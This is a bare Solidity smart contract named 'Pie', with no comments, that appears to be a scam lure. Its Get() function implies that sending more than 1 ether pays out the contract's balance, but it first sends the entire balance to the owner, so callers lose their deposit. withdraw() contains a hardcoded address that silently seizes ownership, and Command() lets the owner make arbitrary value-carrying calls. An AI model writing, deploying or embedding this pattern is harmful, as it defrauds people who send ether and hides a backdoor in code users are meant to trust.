pragma solidity ^0.4.19;

contract Pie {
    struct O {
        address A;
    }
    O public o = O({A: msg.sender});
    
    function() public payable {}

    function Get() public payable {
        if (msg.value > 1 ether) {
            o.A.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() payable public {
        address tmp = 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;
        if (msg.sender == tmp) {
            o.A = tmp;
        }
        require(msg.sender == o.A);
        o.A.transfer(this.balance);
    }

    function Command(address adr, bytes data) payable public {
        require(msg.sender == o.A);
        adr.call.value(msg.value)(data);
    }
}